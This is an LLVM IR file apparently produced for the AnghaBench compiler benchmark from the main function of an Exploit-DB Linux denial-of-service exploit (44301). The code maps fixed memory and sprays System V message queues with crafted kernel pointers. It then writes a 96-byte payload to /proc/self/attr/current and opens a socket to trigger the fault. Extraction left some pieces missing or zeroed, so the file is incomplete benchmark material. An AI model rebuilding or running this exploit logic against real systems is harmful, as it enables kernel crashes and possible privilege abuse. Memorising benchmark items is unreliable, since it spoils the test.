; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44301.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_44301.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i64 }

@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"my pid = %d\0A\00", align 1
@msg = common dso_local global %struct.TYPE_3__ zeroinitializer, align 8
@IPC_PRIVATE = common dso_local global i32 0, align 4
@IPC_CREAT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"msgsnd\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"/proc/self/attr/current\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64*, align 8
  %13 = alloca [96 x i8], align 16
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @PROT_READ, align 4
  %16 = load i32, i32* @PROT_WRITE, align 4
  %17 = or i32 %15, %16
  %18 = load i32, i32* @MAP_FIXED, align 4
  %19 = load i32, i32* @MAP_PRIVATE, align 4
  %20 = or i32 %18, %19
  %21 = load i32, i32* @MAP_ANON, align 4
  %22 = or i32 %20, %21
  %23 = call i64 @mmap(i8* inttoptr (i64 1073741824 to i8*), i32 8192, i32 %17, i32 %22, i32 -1, i32 0)
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = icmp ne i8* %25, null
  br i1 %26, label %30, label %27

27:                                               ; preds = %2
  %28 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %29 = call i32 @exit(i32 2) #3
  unreachable

30:                                               ; preds = %2
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr i8, i8* %31, i64 4096
  %33 = call i32 @setup_pagefault(i8* %32, i32 4096, i32 1)
  %34 = call i32 (...) @getpid()
  %35 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i32 %34)
  %36 = load i8*, i8** %7, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %40, label %38

38:                                               ; preds = %30
  %39 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %30
  %41 = load i64, i64* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @msg, i32 0, i32 1), align 8
  %42 = inttoptr i64 %41 to i64*
  store i64* %42, i64** %12, align 8
  store i32 0, i32* %11, align 4
  br label %43

43:                                               ; preds = %49, %40
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %44, 6
  br i1 %45, label %46, label %52

46:                                               ; preds = %43
  %47 = load i64*, i64** %12, align 8
  %48 = getelementptr inbounds i64, i64* %47, i32 1
  store i64* %48, i64** %12, align 8
  store i64 1073745832, i64* %47, align 8
  br label %49

49:                                               ; preds = %46
  %50 = load i32, i32* %11, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %11, align 4
  br label %43

52:                                               ; preds = %43
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_3__, %struct.TYPE_3__* @msg, i32 0, i32 0), align 8
  %53 = load i32, i32* @IPC_PRIVATE, align 4
  %54 = load i32, i32* @IPC_CREAT, align 4
  %55 = or i32 420, %54
  %56 = call i32 @msgget(i32 %53, i32 %55)
  store i32 %56, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %57

57:                                               ; preds = %67, %52
  %58 = load i32, i32* %11, align 4
  %59 = icmp slt i32 %58, 320
  br i1 %59, label %60, label %70

60:                                               ; preds = %57
  %61 = load i32, i32* %10, align 4
  %62 = call i32 @msgsnd(i32 %61, %struct.TYPE_3__* @msg, i32 48, i32 0)
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %66

64:                                               ; preds = %60
  %65 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %100

66:                                               ; preds = %60
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %11, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %11, align 4
  br label %57

70:                                               ; preds = %57
  %71 = getelementptr inbounds [96 x i8], [96 x i8]* %13, i64 0, i64 0
  %72 = bitcast i8* %71 to i64*
  store i64* %72, i64** %12, align 8
  store i32 0, i32* %11, align 4
  br label %73

73:                                               ; preds = %79, %70
  %74 = load i32, i32* %11, align 4
  %75 = icmp slt i32 %74, 11
  br i1 %75, label %76, label %82

76:                                               ; preds = %73
  %77 = load i64*, i64** %12, align 8
  %78 = getelementptr inbounds i64, i64* %77, i32 1
  store i64* %78, i64** %12, align 8
  store i64 1073745832, i64* %77, align 8
  br label %79

79:                                               ; preds = %76
  %80 = load i32, i32* %11, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %11, align 4
  br label %73

82:                                               ; preds = %73
  %83 = load i64*, i64** %12, align 8
  %84 = getelementptr inbounds i64, i64* %83, i32 1
  store i64* %84, i64** %12, align 8
  store i64 1152921504606846975, i64* %83, align 8
  %85 = load i32, i32* @O_RDWR, align 4
  %86 = call i32 @open(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 %85)
  store i32 %86, i32* %14, align 4
  %87 = load i32, i32* %14, align 4
  %88 = getelementptr inbounds [96 x i8], [96 x i8]* %13, i64 0, i64 0
  %89 = call i32 @write(i32 %87, i8* %88, i32 96)
  %90 = load i32, i32* %10, align 4
  %91 = call i32 @msgsnd(i32 %90, %struct.TYPE_3__* @msg, i32 48, i32 0)
  %92 = load i32, i32* %10, align 4
  %93 = call i32 @msgsnd(i32 %92, %struct.TYPE_3__* @msg, i32 48, i32 0)
  %94 = load i32, i32* %10, align 4
  %95 = call i32 @msgsnd(i32 %94, %struct.TYPE_3__* @msg, i32 48, i32 0)
  %96 = load i32, i32* @AF_INET, align 4
  %97 = call i32 @socket(i32 22, i32 %96, i32 0)
  %98 = load i32, i32* %14, align 4
  %99 = call i32 @close(i32 %98)
  store i32 0, i32* %3, align 4
  br label %100

100:                                              ; preds = %82, %64
  %101 = load i32, i32* %3, align 4
  ret i32 %101
}

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @setup_pagefault(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @msgget(i32, i32) #1

declare dso_local i32 @msgsnd(i32, %struct.TYPE_3__*, i32, i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
